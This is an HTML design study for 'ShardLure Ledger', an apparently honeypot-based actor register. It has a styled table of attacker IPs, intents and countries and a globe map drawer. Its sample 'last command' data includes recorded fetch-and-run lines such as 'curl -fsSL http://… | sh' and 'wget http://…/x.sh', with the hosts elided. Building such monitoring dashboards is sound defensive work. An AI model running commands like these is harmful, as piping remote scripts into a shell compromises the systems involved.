<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Ledger · ShardLure theme study</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet" />
<style>
  /* ─────────────────────────────────────────────────────────────
     LEDGER — cool institutional dark
     Fluorescent ops room. Graphite + zinc + one steel focus.
     Table is the product. Map is a drawer, not the room.
     No glows. Gray ramp for hierarchy. Status ≠ brand.
     ───────────────────────────────────────────────────────────── */
  :root {
    --bg: #0b0d10;
    --panel: #111418;
    --panel-2: #161a20;
    --panel-3: #1b2028;
    --line: #252b34;
    --line-2: #2f3742;
    --ink: #e8eaed;
    --muted: #8b93a0;
    --dim: #5c6572;
    --steel: #6b8cff;
    --steel-soft: rgba(107, 140, 255, 0.12);
    --ok: #3d9a6a;
    --warn: #c9a227;
    --bad: #d64545;
    --sans: "IBM Plex Sans", system-ui, sans-serif;
    --mono: "IBM Plex Mono", ui-monospace, monospace;
  }

  * { box-sizing: border-box; }
  html, body { height: 100%; margin: 0; }
  body {
    font: 13px/1.4 var(--sans);
    color: var(--ink);
    background: var(--bg);
    overflow: hidden;
    -webkit-font-smoothing: antialiased;
  }

  .app {
    display: grid;
    grid-template-columns: 200px 1fr;
    grid-template-rows: 44px 1fr;
    height: 100vh;
  }

  /* top bar */
  .top {
    grid-column: 1 / -1;
    display: flex; align-items: center; gap: 12px;
    padding: 0 12px;
    border-bottom: 1px solid var(--line);
    background: var(--panel);
  }
  .brand {
    display: flex; align-items: center; gap: 8px;
    min-width: 180px;
    font: 600 13px var(--sans);
  }
  .brand .mark {
    width: 16px; height: 16px;
    border: 1.5px solid var(--ink);
    background: transparent;
  }
  .brand em {
    font-style: normal;
    font-weight: 400;
    color: var(--dim);
    margin-left: 2px;
  }
  .breadcrumb {
    font: 400 12px var(--mono);
    color: var(--dim);
  }
  .breadcrumb b { color: var(--muted); font-weight: 500; }
  .top-right {
    margin-left: auto;
    display: flex; align-items: center; gap: 10px;
    font: 400 12px var(--sans);
    color: var(--muted);
  }
  .pill {
    display: inline-flex; align-items: center; gap: 6px;
    font: 500 11px var(--mono);
    color: var(--ok);
    border: 1px solid var(--line);
    padding: 3px 8px;
  }
  .pill i {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--ok);
  }
  .top-right a {
    color: var(--muted);
    text-decoration: none;
    border: 1px solid var(--line);
    padding: 4px 8px;
  }
  .top-right a:hover { color: var(--ink); border-color: var(--line-2); }

  /* side nav */
  .nav {
    border-right: 1px solid var(--line);
    background: var(--panel);
    padding: 10px 8px;
    overflow: auto;
    display: flex; flex-direction: column; gap: 1px;
  }
  .nav .sec {
    font: 500 10px var(--mono);
    letter-spacing: 0.08em;
    text-transform: uppercase;
    color: var(--dim);
    padding: 12px 8px 6px;
  }
  .nav a {
    display: flex; align-items: center; gap: 8px;
    text-decoration: none;
    color: var(--muted);
    padding: 7px 8px;
    font: 500 12.5px var(--sans);
    border: 1px solid transparent;
  }
  .nav a:hover { color: var(--ink); background: var(--panel-2); }
  .nav a.on {
    color: var(--ink);
    background: var(--panel-2);
    border-color: var(--line);
  }
  .nav a .n {
    margin-left: auto;
    font: 400 11px var(--mono);
    color: var(--dim);
  }

  /* main */
  .main {
    display: grid;
    grid-template-rows: auto auto 1fr;
    min-width: 0;
    overflow: hidden;
  }

  .toolbar {
    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
    padding: 12px 14px 8px;
    border-bottom: 1px solid var(--line);
  }
  .toolbar h1 {
    margin: 0 10px 0 0;
    font: 600 15px var(--sans);
    letter-spacing: -0.01em;
  }
  .filter {
    font: 500 11px var(--sans);
    color: var(--muted);
    background: var(--panel);
    border: 1px solid var(--line);
    padding: 4px 10px;
    cursor: pointer;
  }
  .filter.on {
    color: var(--ink);
    border-color: var(--steel);
    background: var(--steel-soft);
  }
  .toolbar .right {
    margin-left: auto;
    display: flex; gap: 6px; align-items: center;
  }
  .btn {
    font: 500 12px var(--sans);
    border: 1px solid var(--line);
    background: var(--panel-2);
    color: var(--ink);
    padding: 5px 10px;
    cursor: pointer;
  }
  .btn:hover { border-color: var(--line-2); }
  .btn.primary {
    background: var(--steel);
    border-color: var(--steel);
    color: #0b0d10;
  }
  .btn.ghost {
    background: transparent;
  }

  .kpis {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 0;
    border-bottom: 1px solid var(--line);
    background: var(--panel);
  }
  .kpi {
    padding: 12px 14px;
    border-right: 1px solid var(--line);
  }
  .kpi:last-child { border-right: 0; }
  .kpi .n {
    font: 600 20px/1 var(--mono);
    font-variant-numeric: tabular-nums;
    letter-spacing: -0.02em;
  }
  .kpi .l {
    margin-top: 4px;
    font: 400 11px var(--sans);
    color: var(--dim);
  }
  .kpi .s {
    margin-top: 4px;
    font: 400 10px var(--mono);
    color: var(--muted);
  }
  .kpi .s.up { color: var(--ok); }
  .kpi .s.dn { color: var(--bad); }

  .table-wrap {
    min-height: 0;
    overflow: auto;
    background: var(--bg);
  }
  table {
    width: 100%;
    border-collapse: collapse;
    font: 12.5px var(--sans);
  }
  th {
    position: sticky; top: 0; z-index: 1;
    background: var(--panel-2);
    text-align: left;
    font: 500 11px var(--sans);
    color: var(--dim);
    padding: 9px 12px;
    border-bottom: 1px solid var(--line);
    white-space: nowrap;
  }
  td {
    padding: 9px 12px;
    border-bottom: 1px solid var(--line);
    vertical-align: middle;
  }
  tr:hover td { background: var(--panel); }
  tr.selected td {
    background: var(--steel-soft);
  }
  td.mono {
    font-family: var(--mono);
    font-size: 11.5px;
  }
  .dot {
    width: 7px; height: 7px; border-radius: 50%;
    display: inline-block;
  }
  .dot.h { background: var(--bad); }
  .dot.m { background: var(--warn); }
  .dot.l { background: var(--ok); }
  .tag {
    display: inline-block;
    font: 500 10px var(--mono);
    padding: 2px 6px;
    border: 1px solid var(--line);
    color: var(--muted);
    text-transform: lowercase;
  }
  .tag.probe { color: var(--steel); border-color: rgba(107,140,255,0.35); }
  .tag.deploy { color: var(--warn); border-color: rgba(201,162,39,0.35); }
  .tag.proxy { color: var(--ok); border-color: rgba(61,154,106,0.35); }
  .tag.mixed { color: var(--muted); }

  /* actor detail drawer (leftish secondary) */
  .detail {
    position: fixed;
    top: 44px; right: 0; bottom: 0;
    width: min(340px, 92vw);
    background: var(--panel);
    border-left: 1px solid var(--line);
    padding: 14px;
    transform: translateX(105%);
    transition: transform .16s ease;
    z-index: 30;
    overflow: auto;
  }
  .detail.open { transform: none; }
  .detail h2 {
    margin: 0 0 2px;
    font: 600 14px var(--mono);
  }
  .detail .sub {
    font: 400 12px var(--sans);
    color: var(--muted);
    margin-bottom: 14px;
  }
  .kv {
    display: grid;
    grid-template-columns: 88px 1fr;
    gap: 6px 10px;
    font: 12px var(--sans);
    padding: 6px 0;
    border-bottom: 1px solid var(--line);
  }
  .kv span { color: var(--dim); }
  .kv b { font-weight: 500; word-break: break-all; }
  .cmdbox {
    margin-top: 12px;
    border: 1px solid var(--line);
    background: var(--bg);
    padding: 10px;
    font: 12px var(--mono);
    color: var(--muted);
  }

  /* map drawer — slides from right, wider, with countries */
  .map-drawer {
    position: fixed;
    top: 44px; right: 0; bottom: 0;
    width: min(520px, 96vw);
    background: var(--panel);
    border-left: 1px solid var(--line);
    z-index: 35;
    display: grid;
    grid-template-rows: auto 1fr auto;
    transform: translateX(105%);
    transition: transform .18s ease;
  }
  .map-drawer.open { transform: none; }
  .map-head {
    display: flex; justify-content: space-between; align-items: center;
    padding: 10px 12px;
    border-bottom: 1px solid var(--line);
  }
  .map-head h2 {
    margin: 0;
    font: 600 13px var(--sans);
  }
  .map-head .meta {
    font: 400 11px var(--mono);
    color: var(--dim);
  }
  .map-head button {
    font: 500 11px var(--sans);
    border: 1px solid var(--line);
    background: transparent;
    color: var(--muted);
    padding: 4px 8px;
    cursor: pointer;
  }
  .map-body {
    display: grid;
    grid-template-columns: 1.1fr 0.9fr;
    min-height: 0;
  }
  #globe-wrap {
    position: relative;
    background: #080a0c;
    min-height: 240px;
  }
  #cobe { width: 100%; height: 100%; display: block; cursor: grab; }
  #cobe:active { cursor: grabbing; }
  .geo {
    border-left: 1px solid var(--line);
    overflow: auto;
    padding: 6px 0;
  }
  .geo-row {
    display: grid;
    grid-template-columns: 26px 1fr auto;
    gap: 6px;
    padding: 7px 12px;
    font: 12px var(--sans);
    align-items: center;
  }
  .geo-row:hover { background: var(--panel-2); }
  .geo-row .r { font: 400 11px var(--mono); color: var(--dim); }
  .geo-row .name { font-weight: 500; }
  .geo-row .name small {
    display: block;
    font: 400 10px var(--mono);
    color: var(--dim);
  }
  .geo-row .h {
    font: 500 11px var(--mono);
    color: var(--muted);
  }
  .geo-row .bar {
    grid-column: 2 / -1;
    height: 2px;
    background: var(--line);
    margin-top: -2px;
  }
  .geo-row .bar i {
    display: block; height: 100%;
    background: var(--steel);
  }
  .map-foot {
    border-top: 1px solid var(--line);
    padding: 8px 10px;
    display: flex; flex-wrap: wrap; gap: 4px;
  }
  .map-foot button {
    font: 500 10px var(--mono);
    color: var(--muted);
    background: var(--bg);
    border: 1px solid var(--line);
    padding: 4px 8px;
    cursor: pointer;
  }
  .map-foot button.on,
  .map-foot button:hover {
    color: var(--ink);
    border-color: var(--steel);
    background: var(--steel-soft);
  }

  .scrim {
    position: fixed; inset: 0; top: 44px;
    background: rgba(0,0,0,0.35);
    z-index: 25;
    opacity: 0; pointer-events: none;
    transition: opacity .16s;
  }
  .scrim.on { opacity: 1; pointer-events: auto; }

  @media (max-width: 900px) {
    .app { grid-template-columns: 1fr; }
    .nav { display: none; }
    .kpis { grid-template-columns: 1fr 1fr; }
    .map-body { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>
<div class="app">
  <header class="top">
    <div class="brand">
      <span class="mark" aria-hidden="true"></span>
      ShardLure <em>· Ledger</em>
    </div>
    <div class="breadcrumb">ops / <b>actor register</b></div>
    <div class="top-right">
      <span class="pill"><i></i>ingest live</span>
      <span id="clock">—</span>
      <a href="./index.html">studies</a>
    </div>
  </header>

  <nav class="nav">
    <div class="sec">Register</div>
    <a class="on" href="#"><span>Actors</span><span class="n">1.3k</span></a>
    <a href="#"><span>Events</span><span class="n">118k</span></a>
    <a href="#"><span>Sessions</span></a>
    <a href="#"><span>Capture</span></a>
    <div class="sec">Context</div>
    <a href="#"><span>Playbooks</span></a>
    <a href="#"><span>Countries</span></a>
    <a href="#"><span>Sources</span></a>
    <div class="sec">System</div>
    <a href="#"><span>Settings</span></a>
  </nav>

  <main class="main">
    <div class="toolbar">
      <h1>Actor register</h1>
      <button type="button" class="filter on" data-f="all">All</button>
      <button type="button" class="filter" data-f="probe">Probe</button>
      <button type="button" class="filter" data-f="deploy">Deploy</button>
      <button type="button" class="filter" data-f="proxy">Proxy</button>
      <div class="right">
        <button type="button" class="btn ghost" id="open-map">Map</button>
        <button type="button" class="btn">Export</button>
        <button type="button" class="btn primary">Enrich</button>
      </div>
    </div>

    <div class="kpis" id="kpis"></div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th></th>
            <th>IP</th>
            <th>Playbook</th>
            <th>Intent</th>
            <th>CC</th>
            <th>Events</th>
            <th>Probe</th>
            <th>Last command</th>
          </tr>
        </thead>
        <tbody id="rows"></tbody>
      </table>
    </div>
  </main>
</div>

<div class="scrim" id="scrim"></div>

<aside class="detail" id="detail">
  <h2 id="d-title">—</h2>
  <div class="sub" id="d-sub">—</div>
  <div id="d-kv"></div>
  <div class="cmdbox" id="d-cmd">—</div>
</aside>

<aside class="map-drawer" id="map-drawer" aria-hidden="true">
  <div class="map-head">
    <div>
      <h2>Field map</h2>
      <div class="meta">φ <span id="phi">—</span> · θ <span id="theta">—</span> · origin Mumbai</div>
    </div>
    <button type="button" id="close-map">Close</button>
  </div>
  <div class="map-body">
    <div id="globe-wrap">
      <canvas id="cobe" width="800" height="800"></canvas>
    </div>
    <div class="geo" id="countries"></div>
  </div>
  <div class="map-foot" id="focuses"></div>
</aside>

<script type="importmap">
{
  "imports": { "cobe": "https://esm.sh/cobe@2.0.0" }
}
</script>
<script type="module">
import createGlobe from "cobe";
import {
  SUMMARY, ACTORS, CAPTURE, COUNTRIES, PLACES,
  fmt, tickClock, globeEntities,
  bindGlobeInteraction, startGlobeLoop, wireFocusButtons,
} from "./_shared.js";

tickClock(document.getElementById("clock"));

document.getElementById("kpis").innerHTML = `
  <div class="kpi"><div class="n">${fmt(SUMMARY.events)}</div><div class="l">Events · 72h</div><div class="s up">▲ 12% prior</div></div>
  <div class="kpi"><div class="n">${fmt(SUMMARY.actors)}</div><div class="l">Actors</div><div class="s up">▲ 4%</div></div>
  <div class="kpi"><div class="n">${fmt(SUMMARY.ips)}</div><div class="l">Unique IPs</div><div class="s dn">▼ 2%</div></div>
  <div class="kpi"><div class="n">${SUMMARY.countries}</div><div class="l">Countries</div><div class="s">active corridors</div></div>
  <div class="kpi"><div class="n">${CAPTURE.saved}</div><div class="l">Payloads</div><div class="s">${CAPTURE.bytes} held</div></div>`;

const maxC = COUNTRIES[0].hits;
document.getElementById("countries").innerHTML = COUNTRIES.map((c, i) => `
  <div class="geo-row">
    <span class="r">${String(i + 1).padStart(2, "0")}</span>
    <span class="name">${c.name}<small>${c.cc}</small></span>
    <span class="h">${fmt(c.hits)}</span>
    <div class="bar"><i style="width:${(c.hits / maxC * 100).toFixed(1)}%"></i></div>
  </div>`).join("");

const intents = ["probe", "deploy", "proxy", "probe", "mixed"];
const cmds = [
  "uname -s -v -n -r -m",
  "cat /proc/cpuinfo",
  "wget http://…/x.sh",
  "curl -fsSL http://… | sh",
  "uname -a",
];

const rows = document.getElementById("rows");
const rowData = ACTORS.map((a, i) => ({
  ...a,
  intent: intents[i % intents.length],
  probe: 40 + (i * 11) % 50,
  cmd: cmds[i % cmds.length],
  sev: a.events > 5000 ? "h" : a.events > 1500 ? "m" : "l",
}));

function paintRows(list) {
  rows.innerHTML = list.map((a, i) => `
    <tr data-i="${i}" data-intent="${a.intent}">
      <td><span class="dot ${a.sev}"></span></td>
      <td class="mono">${a.ip}</td>
      <td>${a.playbook}</td>
      <td><span class="tag ${a.intent}">${a.intent}</span></td>
      <td>${a.cc}</td>
      <td class="mono">${fmt(a.events)}</td>
      <td class="mono">${a.probe}</td>
      <td class="mono" style="color:var(--muted)">${a.cmd}</td>
    </tr>`).join("");
}
paintRows(rowData);

const detail = document.getElementById("detail");
rows.addEventListener("click", (e) => {
  const tr = e.target.closest("tr");
  if (!tr) return;
  rows.querySelectorAll("tr").forEach((r) => r.classList.remove("selected"));
  tr.classList.add("selected");
  const a = rowData[+tr.dataset.i];
  document.getElementById("d-title").textContent = a.ip;
  document.getElementById("d-sub").textContent = `${a.playbook} · ${a.cc}`;
  document.getElementById("d-kv").innerHTML = `
    <div class="kv"><span>Intent</span><b>${a.intent}</b></div>
    <div class="kv"><span>Events</span><b>${fmt(a.events)}</b></div>
    <div class="kv"><span>Probe</span><b>${a.probe}</b></div>
    <div class="kv"><span>Cluster</span><b>cowrie:hassh · family</b></div>
    <div class="kv"><span>Origin</span><b>Mumbai honeypot</b></div>`;
  document.getElementById("d-cmd").textContent = a.cmd;
  detail.classList.add("open");
  closeMap();
});

// filters
document.querySelectorAll(".filter").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter").forEach((b) => b.classList.remove("on"));
    btn.classList.add("on");
    const f = btn.dataset.f;
    paintRows(f === "all" ? rowData : rowData.filter((a) => a.intent === f));
  });
});

// map drawer
const mapDrawer = document.getElementById("map-drawer");
const scrim = document.getElementById("scrim");
let mapOpen = false;
let globeReady = false;
let globe, ix;

function openMap() {
  mapOpen = true;
  mapDrawer.classList.add("open");
  mapDrawer.setAttribute("aria-hidden", "false");
  scrim.classList.add("on");
  detail.classList.remove("open");
  if (!globeReady) initGlobe();
  else {
    // resize after open for correct canvas
    requestAnimationFrame(() => {
      const wrap = document.getElementById("globe-wrap");
      const s = Math.min(wrap.clientWidth, wrap.clientHeight) * 2;
      if (globe) globe.update({ width: s, height: s });
    });
  }
}
function closeMap() {
  mapOpen = false;
  mapDrawer.classList.remove("open");
  mapDrawer.setAttribute("aria-hidden", "true");
  scrim.classList.remove("on");
}
document.getElementById("open-map").addEventListener("click", openMap);
document.getElementById("close-map").addEventListener("click", closeMap);
scrim.addEventListener("click", () => {
  closeMap();
  detail.classList.remove("open");
});
addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeMap();
    detail.classList.remove("open");
  }
  if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "m") {
    e.preventDefault();
    mapOpen ? closeMap() : openMap();
  }
});

function initGlobe() {
  globeReady = true;
  const canvas = document.getElementById("cobe");
  const wrap = document.getElementById("globe-wrap");
  const state = {
    phi: 2.4, theta: 0.22,
    targetPhi: 2.4, targetTheta: 0.22,
    scale: 1, targetScale: 1, autoRotate: true,
  };
  const { markers, arcs } = globeEntities({
    home: [0.42, 0.55, 1.0],
    hot: [0.42, 0.55, 1.0],
    cool: [0.40, 0.44, 0.50],
    arc: [0.42, 0.55, 1.0],
  });
  const size = () => Math.min(wrap.clientWidth, wrap.clientHeight) * 2;
  ix = bindGlobeInteraction(canvas, state, { wrap, places: PLACES });
  wireFocusButtons(document.getElementById("focuses"), ix);
  globe = createGlobe(canvas, {
    devicePixelRatio: 2,
    width: size(), height: size(),
    phi: state.phi, theta: state.theta,
    dark: 1, diffuse: 1.05,
    mapSamples: 18000,
    mapBrightness: 2.8,
    mapBaseBrightness: 0.02,
    baseColor: [0.05, 0.06, 0.08],
    markerColor: [0.42, 0.55, 1.0],
    glowColor: [0.08, 0.09, 0.12],
    markerElevation: 0.01,
    arcColor: [0.42, 0.55, 1.0],
    arcWidth: 0.42, arcHeight: 0.25,
    markers, arcs,
  });
  startGlobeLoop(globe, ix, (view) => {
    document.getElementById("phi").textContent = view.phi.toFixed(2);
    document.getElementById("theta").textContent = view.theta.toFixed(2);
  });
  addEventListener("resize", () => {
    if (!mapOpen) return;
    const s = size();
    globe.update({ width: s, height: s });
  });
}
</script>
